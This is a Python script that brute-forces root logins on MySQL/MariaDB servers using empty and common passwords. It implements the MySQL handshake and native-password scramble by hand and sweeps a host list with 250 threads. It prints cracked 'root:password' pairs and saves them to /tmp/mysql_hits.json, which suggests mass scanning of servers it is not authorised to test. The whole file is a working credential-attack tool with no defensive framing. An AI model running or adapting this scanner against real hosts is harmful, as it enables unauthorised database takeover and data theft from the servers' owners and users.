#!/usr/bin/env python3
"""MySQL/MariaDB: try root with empty/common passwords. Proof = successful query."""
import sys,json,time,threading,socket,struct
from concurrent.futures import ThreadPoolExecutor, as_completed
PW=["","root","password","123456","admin","toor","mysql","12345678","root123","P@ssw0rd"]
def handshake(ip,port=3306,t=6):
    s=socket.create_connection((ip,port),timeout=t); s.settimeout(t)
    hdr=s.recv(4)
    if len(hdr)<4: return None
    ln=hdr[0]|(hdr[1]<<8)|(hdr[2]<<16)
    data=b""
    while len(data)<ln:
        c=s.recv(ln-len(data))
        if not c: break
        data+=c
    return s,data
def pkt(s,seq,payload):
    hdr=struct.pack("<I",len(payload))[:3]+bytes([seq])
    s.sendall(hdr+payload)
def scramble(data,pw):
    # mysql_native_password
    import hashlib
    i=0
    pos=data.index(b"\x00",1)+1 if b"\x00" in data else 1
    # find salt: last 20 bytes minus terminator
    salt=data[-21:-1] if len(data)>21 else data[-20:]
    if not pw: return b""
    s1=hashlib.sha1(pw.encode()).digest()
    s2=hashlib.sha1(s1).digest()
    s3=hashlib.sha1(salt+s2).digest()
    return bytes(a^b for a,b in zip(s1,s3))
def try_pw(ip,pw):
    try:
        r=handshake(ip)
        if not r: return None
        s,data=r
        if len(data)<10 or data[0]!=10: s.close(); return None
        ver=data[1:data.index(b"\x00",1)].decode(errors="replace")
        auth=scramble(data,pw)
        user=b"root\x00"
        payload=bytes([0x05])+b"\x00\x00\x00\x01"+bytes([0x21])+b"\x00"*23+user+bytes([len(auth)])+auth
        pkt(s,1,payload)
        resp=s.recv(1024)
        s.close()
        if resp and resp[0]==0x00: return {"version":ver,"pw":pw}
    except Exception: pass
    return None
def one(host):
    ip=host.split(":")[0]
    for pw in PW:
        r=try_pw(ip,pw)
        if r: return {"host":host,"PROVEN":"MYSQL_ROOT","version":r["version"],"pw":pw}
    return None
def main():
    hosts=[l.strip() for l in open(sys.argv[1]) if l.strip()]
    hits=[];lock=threading.Lock();n=0;t0=time.time()
    with ThreadPoolExecutor(max_workers=250) as ex:
        for f in as_completed([ex.submit(one,h) for h in hosts]):
            n+=1
            try: r=f.result()
            except Exception: r=None
            if r:
                with lock:
                    hits.append(r); json.dump(hits,open("/tmp/mysql_hits.json","w"),indent=1)
                print(f"🔥 {r['host']} root:{r['pw']} {r['version']}",flush=True)
            if n%5000==0: print(f"  .. {n}/{len(hosts)} hits={len(hits)} {time.time()-t0:.0f}s",flush=True)
    print(f"DONE n={len(hosts)} hits={len(hits)}",flush=True)
main()
